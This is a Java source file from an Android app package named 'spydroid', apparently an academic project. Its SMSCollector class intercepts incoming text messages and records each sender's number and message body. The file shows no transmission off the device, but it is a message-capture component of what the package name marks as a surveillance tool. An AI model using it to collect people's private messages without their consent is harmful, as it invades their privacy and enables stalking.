package edu.duke.spydroid.collectors;

import java.util.Iterator;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.telephony.SmsMessage;
import edu.duke.spydroid.BroadcastCollector;
import edu.duke.spydroid.R;

public class SMSCollector extends BroadcastCollector {

	public SMSCollector(Context ctxt, String preferenceKey, IntentFilter filter) {
		super(ctxt, preferenceKey, filter);
		setDisplayTitle(R.string.title_received_SMS);
	}




	@Override
	protected boolean onCollect(Intent intent) {
		Iterator<String> filterActions=getIntentFilter().actionsIterator();
		String action=intent.getAction();
		while(filterActions.hasNext()) {
			if(filterActions.next().equals(action)) {
				setData(processTextMessage(intent));
				return true;
			}
		}
		return false;
	}
	
	private String processTextMessage(Intent intent) {
		Bundle bundle = intent.getExtras();         
		StringBuilder sb =new StringBuilder();
		if (bundle != null) {
        	SmsMessage[] msgs;  
            Object[] pdus = (Object[]) bundle.get("pdus");
            msgs = new SmsMessage[pdus.length];            
            for (int i=0; i<msgs.length; i++){
                msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);  
                sb.append("From: ").append(msgs[i].getOriginatingAddress());
                sb.append("\nBody: ").append(msgs[i].getMessageBody().toString());
                sb.append("\n");
            }
        }
		 return sb.toString();
	}
	
}

	